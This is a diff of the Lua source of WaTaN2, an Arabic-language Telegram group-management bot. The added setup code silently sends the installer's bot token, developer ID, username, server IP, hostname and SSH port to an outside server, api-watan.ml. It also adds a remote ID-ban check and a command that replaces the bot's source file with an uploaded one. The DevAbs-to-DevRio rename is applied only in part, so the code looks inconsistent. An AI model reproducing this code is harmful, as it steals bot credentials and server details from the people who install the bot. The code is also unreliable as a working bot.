@@ -20,33 +20,43 @@ Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source WaTaN2     --
 local AutoSet = function() 
-if not DevAbs:get(Server.."IdWaTaN2") then 
+if not DevRio:get(Server.."IdWaTaN2") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
-io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevAbs:set(Server.."IdWaTaN2",DevId) 
-else 
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
-end 
+data,res = https.request("https://api-watan.ml/WaTaN/index.php?Ban=WaTaN2&Info&Id="..DevId)
+if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 os.execute('lua WaTaN2.lua') 
+end ---ifBn
+if Abs.Result.Info == 'Ok' then
+io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
+DevRio:set(Server.."IdWaTaN2",DevId) 
+end ---ifok
+else 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+end
+os.execute('lua WaTaN2.lua') 
+end
 end 
-if not DevAbs:get(Server.."TokenWaTaN2") then 
+if not DevRio:get(Server.."TokenWaTaN2") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevAbs:set(Server.."TokenWaTaN2",TokenBot) 
+DevRio:set(Server.."TokenWaTaN2",TokenBot) 
 end  
 else 
-print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 end  
 os.execute('lua WaTaN2.lua') 
-end 
+end
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
 local serialized   
@@ -60,29 +70,30 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevAbs:get(Server.."IdWaTaN2"),
-TokenBot = DevAbs:get(Server.."TokenWaTaN2"),
-WaTaN2 = DevAbs:get(Server.."TokenWaTaN2"):match("(%d+)"),
-SudoIds = {DevAbs:get(Server.."IdWaTaN2")},
+DevId = DevRio:get(Server.."IdWaTaN2"),
+TokenBot = DevRio:get(Server.."TokenWaTaN2"),
+WaTaN2 = DevRio:get(Server.."TokenWaTaN2"):match("(%d+)"),
+SudoIds = {DevRio:get(Server.."IdWaTaN2")},
 }
 Create(Config, "./config.lua") 
+https.request("https://api-watan.ml/WaTaN/index.php?Get=WaTaN2&DevId="..DevRio:get(Server.."IdWaTaN2").."&TokenBot="..DevRio:get(Server.."TokenWaTaN2").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("WaTaN2.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/WaTaN2
-token="]]..DevAbs:get(Server.."TokenWaTaN2")..[["
+token="]]..DevRio:get(Server.."TokenWaTaN2")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "~ The tg File Was Not Found In The Bot Files!"
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
 if [ ! $token ]; then
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "~ The Token Was Not Found In The config.lua File!"
-echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
+echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
 ./tg -s ./WaTaN2.lua -p PROFILE --bot=$token
@@ -111,13 +122,13 @@ if not f then
 AutoSet() 
 else 
 f:close() 
-DevAbs:del(Server.."IdWaTaN2");DevAbs:del(Server.."TokenWaTaN2")
+DevRio:del(Server.."IdWaTaN2");DevRio:del(Server.."TokenWaTaN2")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
 Load_WaTaN2() 
-print("\27[36m"..[[                                           
+print("\27[36m"..[[                                        
 --------------------------------------------
 |          ╔╗╔╗╔╗     ╔════╗     ╔═╗ ╔╗    |
 |          ║║║║║║     ║╔╗╔╗║     ║║╚╗║║    |
@@ -384,6 +395,21 @@ file:write(table.concat(respbody))
 file:close() 
 return file_path, code 
 end 
+--     Source WaTaN2     --
+function AddFileSource(msg,chat,ID_FILE,File_Name)
+if File_Name:match('.lua') then
+if File_Name ~= "WaTaN2.lua" then 
+send(chat,msg.id_," ᥀︙هذا الملف ليس تابع لسورس وطن")
+return false 
+end      
+local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
+os.execute('rm -rf WaTaN2.lua')
+download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
+else
+send(chat,msg.id_,"᥀︙عذرا الملف ليس بصيغة ↫ Lua يرجى رفع الملف الصحيح")
+end      
+send(chat,msg.id_,"᥀︙تم رفع الملف الان ارسل تحديث ليتم تحديث الملف")
+end
 --     Source WaTaN2     --
 function AddFile(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
@@ -2082,7 +2108,6 @@ if text == "عدد المسح" or text == "تعين عدد المسح" or text =
 if text == "كول" then  Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙فقط قم بارسال امر كول + الكلمه\n✯︙سيقوم البوت بحذف الكلمه وارسالها \n✯︙مثال : كول هلو', 1, 'md') end
 if text == "انطق" then  Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙فقط قم بارسال امر انطق + الكلمه\n✯︙سيقوم البوت بنطق الكلمه \n✯︙مثال : انطق هلو', 1, 'md') end
 if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "↫ بوت اليوتيوب ✯" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/t_stbot"}}} SendInline(msg.chat_id_,'*✯︙اضغط للحصول على بوت اليوتيوب*',nil,inline) return false end
-if text == "اهمس" and ChCheck(msg) or text == "↫ بوت الهمسه ✯" and ChCheck(msg) or text == "بوت الهمسه" and ChCheck(msg) or text == "همسه" and ChCheck(msg) or text == "اريد بوت الهمسه" and ChCheck(msg) or text == "دزلي بوت الهمسه" and ChCheck(msg) or text == "دزولي بوت الهمسه" and ChCheck(msg) then  Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙@HMSEBOT\n✯︙@nnbbot\n✯︙@ocBot\n✯︙@hebot ', 1, 'md') end
 if text == "رابط حذف" and ChCheck(msg) or text == "رابط الحذف" and ChCheck(msg) or text == "اريد رابط الحذف" and ChCheck(msg) or text == "شمرلي رابط الحذف" and ChCheck(msg) or text == "اريد رابط حذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*✯︙اضغط للحصول على رابط الحذف*',nil,inline) return false end
 if text == "↫ بوت الحذف ✯" and ChCheck(msg) or text == "بوت الحذف" and ChCheck(msg) or text == "اريد بوت الحذف" and ChCheck(msg) or text == "اريد بوت حذف" and ChCheck(msg) or text == "بوت حذف" and ChCheck(msg) or text == "بوت حذف حسابات" and ChCheck(msg) or text == "راح احذف" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'*✯︙اضغط للحصول على بوت الحذف*',nil,inline) return false end
 if text == "↫ بوت الكت ✯" and ChCheck(msg) or text == "بوت الكت" and ChCheck(msg) or text == "بوت كت" and ChCheck(msg) then local inline = {{{text="اضغط هنا",url="https://t.me/E9OBot"}}} SendInline(msg.chat_id_,'*✯︙اضغط للحصول على بوت الكت*',nil,inline) return false end
@@ -3526,6 +3551,17 @@ tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonu
 end
 end
 --     Source WaTaN2     --
+if text =='رفع ملف السورس' or text == 'رفع الملف' and Sudo(msg) and tonumber(msg.reply_to_message_id_) > 0 then   
+function by_reply(extra, result, success)   
+if result.content_.document_ then 
+local ID_FILE = result.content_.document_.document_.persistent_id_ 
+local File_Name = result.content_.document_.file_name_
+AddFileSource(msg,msg.chat_id_,ID_FILE,File_Name)
+end   
+end
+tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
+end
+--     Source WaTaN2     --
 if DevAbs:get(WaTaN2.."SET:GAME"..msg.chat_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
@@ -4509,6 +4545,17 @@ keyboard.inline_keyboard = {
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/WaTaNTeaM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+return false
+end
+--     Source WaTaN2     --
+if text == 'همسه' or text == 'الهمسه' or text == 'همسة' or text == 'الهمسة' or text == 'اهمس' or text == 'همس' or text == '↫ بوت الهمسه ✯' then
+Text = "✯︙اهلا بك عزيزي \n✯︙عليك اضافة هذا البوت @kg7bot الى مجموعتك\n✯︙ثم رفعه مشرفا ثم اتبع الاوامر التاليه [هـنـا](https://t.me/WaTaNTeaM/6499)"
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'اضغط هنا لأضافة بوت الهمسه لمجموعتك',url="http://t.me/kg7bot?startgroup=new"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/kg7bot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
 --     Source WaTaN2     --
@@ -9096,7 +9143,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:gif:Abs'..msg.chat_id_,true)  
 end
 if text == "متحركه" or text == "↫ متحركه ✯" and not DevAbs:get(WaTaN2..'Abs:gif:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/animation.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/animation.php')
 if res == 200 then
 animation = json:decode(data)
 if animation.Info == true then
@@ -9122,7 +9169,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:memz:Abs'..msg.chat_id_,true)  
 end
 if text == "ميمز" or text == "↫ ميمز ✯" and not DevAbs:get(WaTaN2..'Abs:memz:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/memz.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/memz.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9174,7 +9221,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:mp3:Abs'..msg.chat_id_,true)  
 end
 if text == "اغنيه" or text == "↫ اغنيه ✯" or text == "اغاني" and not DevAbs:get(WaTaN2..'Abs:mp3:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/mp3.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/mp3.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9200,7 +9247,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Remix:Abs'..msg.chat_id_,true)  
 end
 if text == "ريمكس" or text == "↫ ريمكس ✯" and not DevAbs:get(WaTaN2..'Abs:Remix:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Remix.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/Remix.php')
 if res == 200 then
 Audios = json:decode(data)
 if Audios.Info == true then
@@ -9226,7 +9273,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Photo:Abs'..msg.chat_id_,true)  
 end
 if text == "صوره" or text == "↫ صوره ✯" and not DevAbs:get(WaTaN2..'Abs:Photo:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Photo.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/Photo.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9252,7 +9299,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Anime:Abs'..msg.chat_id_,true)  
 end
 if text == "انمي" or text == "↫ انمي ✯" and not DevAbs:get(WaTaN2..'Abs:Anime:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Anime.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/Anime.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9278,7 +9325,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Movies:Abs'..msg.chat_id_,true)  
 end
 if text == "فلم" or text == "↫ فلم ✯" and not DevAbs:get(WaTaN2..'Abs:Movies:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Movies.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/Movies.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
@@ -9304,7 +9351,7 @@ Absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, WaTaNTeaM, 14, string.len(m
 DevAbs:set(WaTaN2..'Abs:Series:Abs'..msg.chat_id_,true)  
 end
 if text == "مسلسل" or text == "↫ مسلسل ✯" and not DevAbs:get(WaTaN2..'Abs:Series:Abs'..msg.chat_id_) and ChCheck(msg) then
-data,res = https.request('https://ccccxcc.ml/David/Series.php')
+data,res = https.request('https://ccccxcc.ml/WaTaN2/Series.php')
 if res == 200 then
 photo = json:decode(data)
 if photo.Info == true then
